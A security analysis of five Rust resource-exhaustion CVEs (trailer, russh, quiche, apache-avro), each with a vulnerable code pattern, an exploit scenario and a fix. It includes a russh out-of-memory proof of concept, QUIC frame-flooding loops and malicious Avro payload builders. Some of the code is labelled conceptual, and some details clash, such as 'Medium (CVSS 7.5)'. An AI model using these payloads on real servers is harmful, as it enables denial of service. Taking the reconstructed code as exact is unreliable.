# Resource Exhaustion and Out-of-Memory CVE Analysis

This document provides detailed analysis of 5 resource exhaustion vulnerabilities in Rust crates, including vulnerable code patterns and exploitation scenarios.

---

## CVE-2025-47737: trailer - Mishandled Zero-Size Allocation

**Crate:** trailer (through 0.1.2)  
**Severity:** Low (CVSS 2.9)  
**CWE:** CWE-762 (Mismatched Memory Management Routines)

### Vulnerability Description

The `trailer` crate's `Trailer::new()` constructor calls `alloc()` with a zero-sized layout when:
1. The capacity parameter is 0, AND
2. Type `T` is not a Zero-Sized Type (ZST)

Allocating with size 0 for non-ZST types is undefined behavior in Rust's memory allocation model.

### Vulnerable Code Pattern

```rust
// From trailer crate src/lib.rs
impl<T: Default> Trailer<T> {
    pub fn new(capacity: usize) -> Trailer<T> {
        unsafe {
            // BUG: No check that T is not a ZST before allocating
            // BUG: No check that capacity > 0 when T is not a ZST
            let trailer = Trailer::allocate(capacity);
            let ptr = trailer.ptr as *mut T;
            ptr.write(T::default());
            trailer
        }
    }
    
    unsafe fn allocate(capacity: usize) -> Trailer<T> {
        // When capacity = 0 and T is not ZST:
        // Layout::array::<T>(0) creates a zero-sized layout
        let layout = Layout::array::<T>(capacity).unwrap();
        
        // UNDEFINED BEHAVIOR: Calling alloc with size = 0
        // The Rust allocator API explicitly forbids this
        let ptr = alloc(layout);
        
        Trailer {
            ptr,
            capacity,
            len: 0,
            _marker: PhantomData,
        }
    }
}
```

### Exploitation Scenario

```rust
use trailer::Trailer;

// A non-ZST type (has actual size)
#[derive(Default)]
struct NonZst {
    data: u64,  // 8 bytes - not a ZST
}

fn main() {
    // TRIGGER: Create Trailer with capacity 0 for non-ZST type
    // This calls alloc() with a zero-sized layout → undefined behavior
    let trailer: Trailer<NonZst> = Trailer::new(0);
    
    // The undefined behavior may manifest as:
    // - Memory corruption
    // - Crash on drop() due to mismatched deallocation
    // - Silent data corruption
    drop(trailer);  // May crash here with double-free or invalid free
}

// ZST case - also problematic
#[derive(Default)]
struct Zst;  // Zero-sized type

fn zst_case() {
    // Even with ZST, the allocation behavior is undefined
    let trailer: Trailer<Zst> = Trailer::new(0);
    drop(trailer);
}
```

### Root Cause Analysis

The vulnerability stems from two missing validations:

1. **No ZST check:** The code doesn't verify `std::mem::size_of::<T>() > 0`
2. **No capacity check:** When `T` is not a ZST, `capacity = 0` creates a zero-sized allocation

From Rust's `GlobalAlloc` documentation:
> The behavior is undefined if [...] `layout.size() == 0`

### Fix Pattern

```rust
impl<T: Default> Trailer<T> {
    pub fn new(capacity: usize) -> Trailer<T> {
        // FIX 1: Check for ZST
        assert!(std::mem::size_of::<T>() > 0, "Trailer does not support ZSTs");
        
        // FIX 2: Require non-zero capacity OR handle zero specially
        if capacity == 0 {
            return Trailer {
                ptr: std::ptr::NonNull::dangling().as_ptr(),
                capacity: 0,
                len: 0,
                _marker: PhantomData,
            };
        }
        
        unsafe {
            let trailer = Trailer::allocate(capacity);
            let ptr = trailer.ptr as *mut T;
            ptr.write(T::default());
            trailer
        }
    }
}
```

---

## CVE-2024-43410: Russh - Untrusted Memory Allocation for OOM

**Crate:** russh (through 0.44.0)  
**Severity:** High (CVSS 7.5)  
**CWE:** CWE-770 (Allocation of Resources Without Limits)

### Vulnerability Description

The russh SSH library allocates memory based on a 4-byte length field from untrusted network input without any validation. An attacker can send packets claiming arbitrary lengths (up to 4GB), causing immediate OOM.

### Vulnerable Code Pattern

```rust
// From russh/src/cipher/mod.rs (before fix)
impl SSHBuffer {
    pub async fn read_ssh_packet<R: AsyncRead + Unpin>(
        &mut self,
        stream: &mut R,
    ) -> Result<(), Error> {
        // Read 4-byte packet length from network
        let mut len_bytes = [0u8; 4];
        stream.read_exact(&mut len_bytes).await?;
        
        // Parse length as big-endian u32
        let packet_len = u32::from_be_bytes(len_bytes) as usize;
        
        // BUG: Directly use untrusted length to allocate memory
        // No validation! Attacker can specify 0xFFFFFF00 (~4GB)
        self.buffer.buffer.resize(packet_len + 4);
        //                        ^^^^^^^^^^
        // This allocates whatever the attacker specified!
        
        // Read the rest of the packet
        stream.read_exact(&mut self.buffer.buffer[4..]).await?;
        
        Ok(())
    }
}

// The resize() implementation
impl Buffer {
    fn resize(&mut self, new_len: usize) {
        if new_len > self.buffer.capacity() {
            // Vec::reserve allocates (new_len - current_capacity) bytes
            // If new_len is 4GB, this tries to allocate ~4GB
            self.buffer.reserve(new_len - self.buffer.len());
        }
        // ... rest of resize logic
    }
}
```

### Exploitation Scenario

```rust
// Attacker's exploit code (not part of russh)
use std::io::Write;
use std::net::TcpStream;

fn exploit_russh_server(target: &str) -> std::io::Result<()> {
    // Connect to SSH server
    let mut stream = TcpStream::connect(target)?;
    
    // Send SSH version string (required for handshake)
    stream.write_all(b"SSH-2.0-OpenSSH_9.7\r\n")?;
    
    // Read server's version string
    let mut buf = [0u8; 1000];
    stream.read(&mut buf)?;
    
    // ATTACK: Send packet with massive length field
    // First 4 bytes: 0xFFFFFF00 = 4,294,967,040 bytes (~4GB)
    let malicious_packet = [
        0xFF, 0xFF, 0xFF, 0x00,  // Length field: ~4GB
        // Followed by minimal valid SSH packet structure
        0x07,  // padding_length
        0x14,  // SSH_MSG_KEXINIT
        // ... rest of KEXINIT packet ...
    ];
    
    stream.write_all(&malicious_packet)?;
    
    // Server now tries to allocate 4GB of memory
    // With a few such requests, server OOMs and crashes
    
    Ok(())
}

// Full PoC from the security advisory
fn full_poc() -> Result<(), Box<dyn std::error::Error>> {
    for i in 0..5 {
        eprintln!("iteration {i}");
        let mut s = TcpStream::connect("0.0.0.0:2222")?;
        
        s.write_all(b"SSH-2.0-OpenSSH_9.7\r\n")?;
        s.read(&mut [0; 1000])?;
        
        // Send KeyExchangeInit with length replaced to 0xFFFFFF00
        // The hex blob is a real KEXINIT packet with modified length
        s.write_all(&hex_literal::hex!(
            "ffffff00071401af35150e67f2bc6dc4bc6b5330901900..."
            // ... (truncated for brevity)
        ))?;
        
        s.shutdown(std::net::Shutdown::Both)?;
    }
    Ok(())
}
```

### Attack Flow Diagram

```
Attacker                              Russh Server
   |                                       |
   |-- SSH-2.0-... ----------------------->|
   |<-- SSH-2.0-... -----------------------|
   |                                       |
   |-- [0xFF,0xFF,0xFF,0x00] + payload --->|
   |                                       |
   |              Server parses length: 4,294,967,040 bytes
   |              Server calls: buffer.resize(4,294,967,040)
   |              System attempts 4GB allocation
   |              
   |              RESULT: OOM / Process killed
   |                                       X
```

### Root Cause Analysis

RFC 4253 Section 6.1 explicitly warns about this:
> Implementations SHOULD check that the packet length is reasonable in order for the implementation to avoid denial of service and/or buffer overflow attacks.

The SSH specification recommends a maximum packet size of 35,000 bytes for most implementations.

### Fix Pattern

```rust
// From russh/src/cipher/mod.rs (after fix)

/// Maximum SSH packet size (RFC 4253 recommendation)
const MAX_PACKET_LENGTH: usize = 35_000;

impl SSHBuffer {
    pub async fn read_ssh_packet<R: AsyncRead + Unpin>(
        &mut self,
        stream: &mut R,
    ) -> Result<(), Error> {
        let mut len_bytes = [0u8; 4];
        stream.read_exact(&mut len_bytes).await?;
        
        let packet_len = u32::from_be_bytes(len_bytes) as usize;
        
        // FIX: Validate packet length before allocation
        if packet_len > MAX_PACKET_LENGTH {
            return Err(Error::PacketTooLarge {
                received: packet_len,
                maximum: MAX_PACKET_LENGTH,
            });
        }
        
        self.buffer.buffer.resize(packet_len + 4);
        stream.read_exact(&mut self.buffer.buffer[4..]).await?;
        
        Ok(())
    }
}
```

---

## CVE-2024-1765: Cloudflare Quiche - Unlimited CRYPTO Frame Resource Allocation

**Crate:** quiche (through 0.19.1/0.20.0)  
**Severity:** Medium (CVSS 5.9)  
**CWE:** CWE-770 (Allocation of Resources Without Limits)

### Vulnerability Description

After completing the QUIC handshake, an attacker can send unlimited 1-RTT CRYPTO frames. The quiche library buffers these frames without any limit on the total offset or number of frames, causing unbounded memory growth.

### Vulnerable Code Pattern

```rust
// Conceptual vulnerable pattern in quiche's CRYPTO stream handling
// From quiche/src/stream.rs (before fix)

pub struct CryptoStream {
    // Stores out-of-order CRYPTO frame data
    recv_buf: RecvBuf,
    // No limit on how much data can be buffered!
}

impl CryptoStream {
    /// Process incoming CRYPTO frame
    pub fn recv(&mut self, frame: &CryptoFrame) -> Result<()> {
        // BUG: No validation of frame.offset against maximum
        // Attacker can send frames with arbitrarily high offsets
        
        // Each frame with a new offset creates a new buffer entry
        self.recv_buf.write(frame.offset, frame.data)?;
        //                  ^^^^^^^^^^^^
        // If offset is huge (e.g., u64::MAX - 1000), this allocates
        // memory to track the gap
        
        Ok(())
    }
}

// The RecvBuf implementation
pub struct RecvBuf {
    // Maps offset -> data for out-of-order reassembly
    data: BTreeMap<u64, Vec<u8>>,
    // No limit on total buffered bytes!
}

impl RecvBuf {
    pub fn write(&mut self, offset: u64, data: &[u8]) -> Result<()> {
        // BUG: No check on maximum offset
        // BUG: No check on total buffered data size
        self.data.insert(offset, data.to_vec());
        Ok(())
    }
}
```

### Exploitation Scenario

```rust
// Attack pattern (conceptual)
fn exploit_quiche_crypto_flood(conn: &mut QuicConnection) {
    // First: Complete the handshake normally
    complete_quic_handshake(conn);
    
    // Attack: Send many CRYPTO frames with increasing offsets
    // Each frame is small, but the total buffered state grows unboundedly
    
    let mut offset: u64 = 0;
    loop {
        // Create CRYPTO frame with current offset
        let crypto_frame = CryptoFrame {
            offset,
            data: vec![0u8; 100],  // Small payload
        };
        
        // Send it (this is after 1-RTT, so it's encrypted)
        conn.send_frame(Frame::Crypto(crypto_frame));
        
        // Increment offset for next frame
        // Each unique offset requires server to buffer
        offset += 100;
        
        // Server's memory grows by ~100 bytes per frame
        // After millions of frames, server OOMs
    }
}

// The attack works because:
// 1. After handshake, CRYPTO frames are still valid (for session tickets, etc.)
// 2. Server must buffer out-of-order data for reassembly
// 3. No limit on how much CRYPTO data can be buffered
// 4. Attacker can keep connection alive indefinitely
```

### Attack Flow Diagram

```
Attacker                              Quiche Server
   |                                       |
   |===== Complete QUIC Handshake ========>|
   |<==== Handshake Complete =============|
   |                                       |
   |-- CRYPTO[off=0, len=100] ------------>|  Buffer: 100 bytes
   |-- CRYPTO[off=100, len=100] ---------->|  Buffer: 200 bytes
   |-- CRYPTO[off=200, len=100] ---------->|  Buffer: 300 bytes
   |                ...                    |
   |-- CRYPTO[off=N*100, len=100] -------->|  Buffer: (N+1)*100 bytes
   |                                       |
   |  (Attacker sends millions of frames)  |
   |                                       |
   |                              Server memory exhausted
   |                                       X
```

### Fix Pattern

```rust
// After fix: Add maximum offset limit
const MAX_CRYPTO_STREAM_OFFSET: u64 = 16 * 1024;  // 16KB limit

impl CryptoStream {
    pub fn recv(&mut self, frame: &CryptoFrame) -> Result<()> {
        // FIX: Check that offset doesn't exceed maximum
        let end_offset = frame.offset
            .checked_add(frame.data.len() as u64)
            .ok_or(Error::InvalidFrame)?;
            
        if end_offset > MAX_CRYPTO_STREAM_OFFSET {
            return Err(Error::CryptoBufferExceeded);
        }
        
        self.recv_buf.write(frame.offset, frame.data)?;
        Ok(())
    }
}
```

---

## CVE-2024-1410: Cloudflare Quiche - Unbounded Connection ID Storage

**Crate:** quiche (through 0.19.1/0.20.0)  
**Severity:** Low (CVSS 3.7)  
**CWE:** CWE-400 (Uncontrolled Resource Consumption)

### Vulnerability Description

QUIC connections use multiple Connection IDs for path migration and privacy. When a peer retires old IDs, the endpoint must acknowledge this with RETIRE_CONNECTION_ID frames. An attacker can flood NEW_CONNECTION_ID frames faster than the victim can send retirement acknowledgments, causing unbounded queue growth.

### QUIC Connection ID Background

```
QUIC Connection ID Management (RFC 9000 Section 5.1):

1. Each endpoint has an active_connection_id_limit (e.g., 4)
2. Peer can issue new IDs via NEW_CONNECTION_ID frame
3. To stay within limit, old IDs must be retired
4. NEW_CONNECTION_ID contains retire_prior_to field
5. Receiver must send RETIRE_CONNECTION_ID for each retired ID
```

### Vulnerable Code Pattern

```rust
// Conceptual vulnerable pattern in quiche's connection ID handling
// From quiche/src/connection.rs (before fix)

pub struct Connection {
    // Queue of connection IDs pending retirement
    // BUG: No limit on queue size!
    ids_to_retire: Vec<ConnectionId>,
    
    // Track issued connection IDs
    local_cids: Vec<ConnectionId>,
    
    // Peer-declared limit
    active_connection_id_limit: u64,
}

impl Connection {
    /// Process NEW_CONNECTION_ID frame from peer
    pub fn on_new_connection_id(&mut self, frame: &NewConnectionIdFrame) -> Result<()> {
        // Add new connection ID
        self.peer_cids.push(frame.connection_id.clone());
        
        // Retire IDs before retire_prior_to
        for id in self.peer_cids.iter() {
            if id.sequence < frame.retire_prior_to {
                // BUG: Queue grows unboundedly if we can't send fast enough
                self.ids_to_retire.push(id.clone());
            }
        }
        
        Ok(())
    }
    
    /// Generate outgoing frames
    pub fn send_frames(&mut self, buf: &mut [u8]) -> Result<usize> {
        let mut written = 0;
        
        // Try to send RETIRE_CONNECTION_ID frames
        while let Some(id) = self.ids_to_retire.first() {
            // But congestion control may limit how many we can send!
            if !self.can_send() {
                break;  // Queue keeps growing...
            }
            
            let frame = RetireConnectionIdFrame { sequence: id.sequence };
            written += frame.encode(&mut buf[written..])?;
            self.ids_to_retire.remove(0);
        }
        
        Ok(written)
    }
}
```

### Exploitation Scenario

```rust
// Attack strategy (conceptual)
fn exploit_connection_id_exhaustion(conn: &mut QuicConnection) {
    // Strategy: Send NEW_CONNECTION_ID frames faster than victim
    // can send RETIRE_CONNECTION_ID frames
    
    let mut sequence: u64 = 0;
    
    loop {
        // 1. Send NEW_CONNECTION_ID with incrementing sequence
        let frame = NewConnectionIdFrame {
            sequence,
            retire_prior_to: sequence,  // Retire all previous IDs
            connection_id: random_cid(),
            stateless_reset_token: random_token(),
        };
        conn.send_frame(Frame::NewConnectionId(frame));
        
        // 2. Manipulate connection to slow down victim's sending
        // - Restrict congestion window via ACK patterns
        // - Cause packet loss to trigger retransmissions
        slow_down_victim_sending(conn);
        
        sequence += 1;
        
        // Victim queues RETIRE_CONNECTION_ID for each frame
        // But can only send a few per RTT due to congestion control
        // Queue grows: O(attack_rate * RTT / send_rate)
    }
}

fn slow_down_victim_sending(conn: &mut QuicConnection) {
    // Techniques to restrict victim's sending rate:
    
    // 1. Send ACKs that imply small congestion window
    // 2. Cause artificial packet loss
    // 3. Increase RTT by delaying ACKs
    
    // Result: Victim can only send ~10 frames per second
    // Attack: Send 1000 NEW_CONNECTION_ID frames per second
    // Queue growth: ~990 entries per second
}
```

### Attack Flow Diagram

```
Attacker                              Quiche Server
   |                                       |
   | (Manipulate congestion to slow sending) |
   |                                       |
   |-- NEW_CID[seq=0, retire_prior=0] ---->| Queue: []
   |-- NEW_CID[seq=1, retire_prior=1] ---->| Queue: [0]
   |-- NEW_CID[seq=2, retire_prior=2] ---->| Queue: [0,1]
   |-- NEW_CID[seq=3, retire_prior=3] ---->| Queue: [0,1,2]
   |                                       |
   |       (Server tries to send RETIRE)   |
   |<---- RETIRE_CID[seq=0] ---------------| Queue: [1,2]
   |                                       |
   |       (But attacker sends faster)     |
   |-- NEW_CID[seq=4, retire_prior=4] ---->| Queue: [1,2,3]
   |-- NEW_CID[seq=5, retire_prior=5] ---->| Queue: [1,2,3,4]
   |              ...                      |
   |                                       |
   |  Attack rate >> Retirement rate       |
   |  Queue grows without bound            |
   |                                       X
```

### Fix Pattern

```rust
// After fix: Limit the retirement queue size
const MAX_PENDING_RETIREMENTS: usize = 256;

impl Connection {
    pub fn on_new_connection_id(&mut self, frame: &NewConnectionIdFrame) -> Result<()> {
        self.peer_cids.push(frame.connection_id.clone());
        
        for id in self.peer_cids.iter() {
            if id.sequence < frame.retire_prior_to {
                // FIX: Check queue limit before adding
                if self.ids_to_retire.len() >= MAX_PENDING_RETIREMENTS {
                    // Either drop the connection or ignore new retirements
                    return Err(Error::TooManyPendingRetirements);
                }
                self.ids_to_retire.push(id.clone());
            }
        }
        
        Ok(())
    }
}
```

---

## CVE-2023-39410 / CVE-2022-36124: Apache Avro - Out of Memory from Untrusted Data

**Note:** CVE-2023-39410 affects the Java SDK. The equivalent Rust vulnerability is **CVE-2022-36124**.

**Crate:** apache-avro / avro-rs (prior to 0.14.0)  
**Severity:** Medium (CVSS 7.5)  
**CWE:** CWE-770 (Allocation of Resources Without Limits)

### Vulnerability Description

Apache Avro's binary encoding format includes length prefixes for variable-length data (strings, bytes, arrays, maps). When deserializing untrusted data, the reader allocates memory based on these length fields without sufficient validation, allowing attackers to cause OOM by specifying huge lengths.

### Avro Binary Encoding Background

```
Avro Binary Format:
- Integers: Variable-length zigzag encoding
- Strings: length (varint) + UTF-8 bytes
- Bytes: length (varint) + raw bytes
- Arrays: block_count (varint) + elements... + 0 (terminator)
- Maps: block_count (varint) + key-value pairs... + 0 (terminator)

The length/count fields are variable-length integers that can encode
values up to 2^63-1, enabling massive allocation requests.
```

### Vulnerable Code Pattern

```rust
// Conceptual vulnerable pattern in avro-rs (before fix)
// From avro-rs/src/decode.rs

/// Decode an Avro string from binary format
fn decode_string<R: Read>(reader: &mut R) -> Result<String, Error> {
    // Read length as variable-length integer
    let len = decode_long(reader)? as usize;
    
    // BUG: No validation of length!
    // Attacker can specify len = 0x7FFFFFFFFFFFFFFF (9 exabytes)
    
    // Allocate buffer of specified size
    let mut buf = vec![0u8; len];
    //                      ^^^
    // This tries to allocate whatever attacker specified!
    
    reader.read_exact(&mut buf)?;
    
    String::from_utf8(buf).map_err(|_| Error::StringDecoding)
}

/// Decode an Avro array from binary format  
fn decode_array<R: Read>(reader: &mut R, schema: &Schema) -> Result<Vec<Value>, Error> {
    let mut items = Vec::new();
    
    loop {
        // Read block count (can be negative for block size info)
        let block_count = decode_long(reader)?;
        
        if block_count == 0 {
            break;  // End of array
        }
        
        let count = block_count.unsigned_abs() as usize;
        
        // BUG: No limit on count!
        // Reserve space for all items in block
        items.reserve(count);
        //            ^^^^^
        // If count is huge, this allocates massive memory
        
        for _ in 0..count {
            items.push(decode_value(reader, schema)?);
        }
    }
    
    Ok(items)
}

/// Decode Avro data block
fn decode_block<R: Read>(reader: &mut R) -> Result<Vec<Value>, Error> {
    // Read block header
    let record_count = decode_long(reader)? as usize;
    let block_size = decode_long(reader)? as usize;
    
    // BUG: Allocate based on untrusted block_size
    let mut block_data = vec![0u8; block_size];
    reader.read_exact(&mut block_data)?;
    
    // ... decompress and decode records
    Ok(values)
}
```

### Exploitation Scenario

```rust
// Creating malicious Avro data
fn create_malicious_avro_data() -> Vec<u8> {
    let mut data = Vec::new();
    
    // Avro file header (simplified)
    data.extend_from_slice(b"Obj\x01");  // Magic
    // ... schema and sync marker ...
    
    // Malicious block header:
    // Record count: 1 (legitimate)
    data.push(0x02);  // Varint: 1
    
    // Block size: 0x7FFFFFFFFFFFFFFF (huge!)
    // Varint encoding of maximum i64
    data.extend_from_slice(&[
        0xFE, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x7F
    ]);
    
    // Reader will try to allocate 9 exabytes!
    
    data
}

// Attack execution
fn exploit_avro_reader() {
    let malicious_data = create_malicious_avro_data();
    
    // Victim code
    let reader = avro_rs::Reader::new(&malicious_data[..]);
    
    // This triggers the OOM:
    for record in reader {
        // Never reaches here - OOM during block allocation
        println!("{:?}", record);
    }
}

// Alternative: Malicious string length
fn create_malicious_string_data() -> Vec<u8> {
    let mut data = Vec::new();
    
    // String length: 0x7FFFFFFF (2GB)
    // Even "just" 2GB can OOM many systems
    data.extend_from_slice(&[0xFE, 0xFF, 0xFF, 0xFF, 0x0F]);
    
    // Only need 1 byte of actual data
    // Reader tries to allocate 2GB before reading
    data.push(b'A');
    
    data
}
```

### Root Cause Analysis

The vulnerability exists because:

1. **Varint allows huge values:** Avro's variable-length integer encoding can represent values up to 2^63-1
2. **No allocation limits:** Reader allocates exactly what the length field specifies
3. **Allocation before reading:** Memory is allocated before data is actually read
4. **No total limit:** Multiple small allocations can also exhaust memory

### Fix Pattern (in apache-avro 0.14.0+)

```rust
// From apache-avro (after fix)
use std::sync::Once;

// Global allocation limit (default 512MB)
static MAX_ALLOCATION_BYTES: AtomicUsize = AtomicUsize::new(512 * 1024 * 1024);
static INIT: Once = Once::new();

/// Set the maximum allocation size for Avro decoding
pub fn max_allocation_bytes(limit: usize) {
    INIT.call_once(|| {
        MAX_ALLOCATION_BYTES.store(limit, Ordering::SeqCst);
    });
}

fn decode_string<R: Read>(reader: &mut R) -> Result<String, Error> {
    let len = decode_long(reader)? as usize;
    
    // FIX: Check against allocation limit
    let max_alloc = MAX_ALLOCATION_BYTES.load(Ordering::SeqCst);
    if len > max_alloc {
        return Err(Error::AllocationTooLarge {
            requested: len,
            maximum: max_alloc,
        });
    }
    
    let mut buf = vec![0u8; len];
    reader.read_exact(&mut buf)?;
    
    String::from_utf8(buf).map_err(|_| Error::StringDecoding)
}

// Usage in application code:
fn safe_avro_reading() {
    // Configure limit before any decoding
    apache_avro::max_allocation_bytes(100 * 1024 * 1024);  // 100MB
    
    let reader = apache_avro::Reader::new(data)?;
    // Now protected against OOM attacks
}
```

---

## Common Patterns and Mitigations

### Resource Exhaustion Vulnerability Patterns

| CVE | Pattern | Attack Vector | Impact |
|-----|---------|---------------|--------|
| CVE-2025-47737 | Zero-size allocation | Local | UB/Crash |
| CVE-2024-43410 | Untrusted length → allocation | Network | OOM/DoS |
| CVE-2024-1765 | Unbounded frame buffering | Network | OOM/DoS |
| CVE-2024-1410 | Unbounded queue growth | Network | Slow DoS |
| CVE-2022-36124 | Untrusted length → allocation | Network | OOM/DoS |

### Common Root Causes

1. **Trusting Length Fields**
   - Network protocols often include length prefixes
   - These must be validated before allocation
   - Maximum reasonable values depend on context

2. **Unbounded Data Structures**
   - Queues, buffers, and caches can grow without limit
   - Attack rate may exceed processing rate
   - Need explicit limits on size/count

3. **Missing Edge Case Checks**
   - Zero-size allocations
   - Integer overflow in size calculations
   - Empty inputs causing divide-by-zero

### Mitigation Strategies

```rust
// 1. Always validate lengths before allocation
const MAX_PACKET_SIZE: usize = 65536;

fn read_packet(stream: &mut impl Read) -> Result<Vec<u8>> {
    let len = read_u32(stream)? as usize;
    
    if len > MAX_PACKET_SIZE {
        return Err(Error::PacketTooLarge);
    }
    
    let mut buf = vec![0u8; len];
    stream.read_exact(&mut buf)?;
    Ok(buf)
}

// 2. Limit queue/buffer sizes
struct BoundedQueue<T> {
    items: VecDeque<T>,
    max_size: usize,
}

impl<T> BoundedQueue<T> {
    fn push(&mut self, item: T) -> Result<(), QueueFullError> {
        if self.items.len() >= self.max_size {
            return Err(QueueFullError);
        }
        self.items.push_back(item);
        Ok(())
    }
}

// 3. Handle zero-size cases explicitly
fn safe_allocate<T>(count: usize) -> Vec<T> {
    if count == 0 || std::mem::size_of::<T>() == 0 {
        return Vec::new();  // Don't actually allocate
    }
    
    Vec::with_capacity(count)
}

// 4. Use checked arithmetic for size calculations
fn calculate_buffer_size(item_size: usize, count: usize) -> Option<usize> {
    item_size.checked_mul(count)
}
```

### Static Analysis Detection Hints

Resource exhaustion vulnerabilities can be detected by looking for:

1. **Allocation from untrusted input:**
   ```rust
   // Pattern: vec![...; untrusted_len] or Vec::with_capacity(untrusted_len)
   let user_len = read_from_network();
   let buffer = vec![0u8; user_len];  // SUSPECT
   ```

2. **Unbounded collections:**
   ```rust
   // Pattern: push/insert without size check
   loop {
       let item = receive_item();
       items.push(item);  // SUSPECT: no limit check
   }
   ```

3. **Missing allocation limit configuration:**
   ```rust
   // Pattern: deserialize without limits
   let data: UserData = deserialize(&bytes)?;  // SUSPECT
   ```

---

## Summary

These five CVEs demonstrate that resource exhaustion vulnerabilities remain common even in memory-safe languages like Rust. While Rust prevents memory corruption, it doesn't automatically prevent:

- Allocating arbitrary amounts of memory
- Unbounded growth of data structures  
- Trusting length fields from untrusted sources

The key defense is **explicit resource limits** at all trust boundaries, especially when processing network input or untrusted data files.
